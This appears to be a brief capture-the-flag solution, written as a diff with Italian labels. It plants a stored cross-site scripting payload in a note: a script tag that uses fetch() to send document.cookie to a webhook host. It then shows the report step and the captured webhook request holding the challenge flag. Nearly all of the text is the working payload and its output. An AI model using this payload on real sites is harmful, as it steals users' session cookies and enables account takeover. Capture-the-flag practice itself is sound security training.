@@ -1,0 +1,9 @@
+Note:
+<p id="debug"><p>
+<script>fetch("https://webhooksite.net/[PRIVATO]/?cookie=" + document.cookie)</script>
+
+Report:
+id = note con fetch
+
+Richiesta webhook:
+flag=flag{m36l10_r1mu0v3r3_1l_d3bu6_1n_pr0duz10n3}
